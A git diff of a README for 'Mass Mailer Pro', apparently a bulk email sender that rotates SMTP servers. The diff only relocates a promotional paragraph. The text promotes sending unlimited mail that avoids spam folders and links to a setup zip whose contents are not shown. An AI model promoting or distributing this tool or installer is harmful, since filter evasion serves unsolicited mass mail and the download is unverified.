@@ -1,7 +1,6 @@
 # 🚀 Mass Mailer Pro - Bulk Email Sender & SMTP Rotator
 
 ---
-**Mass Mailer Pro** is a powerful, open-source **bulk email sender** and **SMTP rotation tool** designed for high-volume email marketing campaigns, newsletters, and cold outreach. Built with modern web technologies, this lightweight **mass mailing software** allows you to send unlimited emails using multiple SMTP servers to ensure high deliverability and avoid spam folders.
 
 <div align="center">
 
@@ -10,6 +9,12 @@
 [![Status](https://img.shields.io/badge/Status-Active-success)]()
 
 <br/>
+
+---
+
+**Mass Mailer Pro** is a powerful, open-source **bulk email sender** and **SMTP rotation tool** designed for high-volume email marketing campaigns, newsletters, and cold outreach. Built with modern web technologies, this lightweight **mass mailing software** allows you to send unlimited emails using multiple SMTP servers to ensure high deliverability and avoid spam folders.
+
+---
 
 ## 📥 DOWNLOAD LATEST VERSION
 <a href="https://github.com/gicFlow989/MassMailer2026/releases/download/Release/MassMailer2026.Setup.1.8.8.zip">
